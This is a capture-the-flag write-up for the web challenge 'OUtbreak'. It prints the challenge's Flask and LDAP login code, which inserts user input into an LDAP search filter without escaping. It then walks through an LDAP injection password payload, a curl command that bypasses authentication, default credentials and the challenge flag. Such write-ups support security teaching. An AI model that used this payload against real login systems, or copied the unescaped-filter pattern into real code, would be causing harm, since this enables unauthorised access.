
# OUtbreak

 * Category: Web
 * Solved by the JCTF Team

## Description

> A legacy login system is still in use, but something about how it handles input seems strange. Can you can gain access without the creds?

The application sources were attached.

<details>

<summary>Click to view sources</summary>

#### index.py

```python
import os
from auth import authenticate_user
from flask import Flask, render_template, request

FLAG = os.getenv("FLAG", "AppSec-IL{This_Is_Not_The_Flag}")
app = Flask("App")

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if password == "*":
        return render_template('login.html', error='What are you trying to do?')

    username = authenticate_user(username, password)
    if username:
        return render_template("welcome.html", username=username, flag=FLAG)
    else:
        return render_template('login.html', error='Username or password is incorrect')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)

```

#### auth.py

```python
import os
import sys
import ldap3

SERVER = "ldap"
LDAP_SERVER = f'ldap://{SERVER}' 
LDAP_USER = os.getenv("LDAP_USER", 'cn=admin,dc=owasp,dc=ctf')
LDAP_PASSWORD = os.getenv("LDAP_PASSWORD", 'admin')
BASE_DN = os.getenv('BASE_DN', 'dc=owasp,dc=ctf')


def create_ldap_connection():
    server = ldap3.Server(LDAP_SERVER, port=1389, get_info=ldap3.ALL)
    connection = ldap3.Connection(server, user=LDAP_USER, password=LDAP_PASSWORD, auto_bind=True)
    return connection


def authenticate_user(username: str, password: str):
    connection = create_ldap_connection()
    try:
        search_filter = f"(&(cn={username})(userPassword={password}))"
        connection.search(
            search_base=BASE_DN,
            search_filter=search_filter,
            search_scope=ldap3.SUBTREE,
            attributes=['cn']
        )
        result = connection.entries
        print(result)
        if result:
            return result[0].cn.value[1]
    except Exception as e:
        print(e, file=sys.stderr)
    finally:
        connection.unbind()
    return None
```

#### docker-compose.yml

```yml
version: "3"

services:
  ldap:
    image: bitnami/openldap:latest
    environment:
      LDAP_ROOT_PASSWORD: "admin"
      LDAP_ROOT: 'dc=owasp,dc=ctf'
      LDAP_ADMIN_DN : 'cn=admin,dc=owasp,dc=ctf'
      LDAP_ADMIN_USERNAME: 'admin'
      LDAP_ADMIN_PASSWORD: 'admin'
      LDAP_USERS: 'DaGoat'
      LDAP_PASSWORDS: 'secret'
    expose:
      - '1389'

  backend:
    build: backend
    depends_on:
      - ldap
    ports:
      - "5000:5000"
```

</details>


## Solution

We have a simple Flask application that connects to a backend LDAP server to query user
authentication details.

From the docker file, we know that the user name is "DaGoat" (the password in the docker
is "secret" but it doesn't work). 

To login successfully, we need the search filter in `authenticate_user` to return
some result: `f"(&(cn={username})(userPassword={password}))"`

How do we do that without knowing the correct password? Luckily for us, the username and
password that we provide get inserted directly into the query, allowing us to inject
some specially crafted input in order to manipulate it.

For example, if we provide `DaGoat` as the username and `*)(objectClass=*` as the password,
the final query will become:

```
(&(cn=DaGoat)(userPassword=*)(objectClass=*))
```

This query represents the AND of three conditions:
 * `(cn=DaGoat)`: The entry must have a Common Name (cn) of "DaGoat"
 * `(userPassword=*`: The entry must have a `userPassword` attribute present
 * `(objectClass=*)`: The entry must have at least one objectClass value (which is mandatory for LDAP entries, making this condition always true)

Using this injection we get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/OUtbreak]
└─$ curl 'https://outbreak.appsecil.ctf.today/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=DaGoat&password=*%29%28objectClass%3D*' -s | grep AppSec
        <h3>AppSec-IL{inj3cti0n_s1mP1y_w0Rk5}</h3>
```


The flag: `AppSec-IL{inj3cti0n_s1mP1y_w0Rk5}`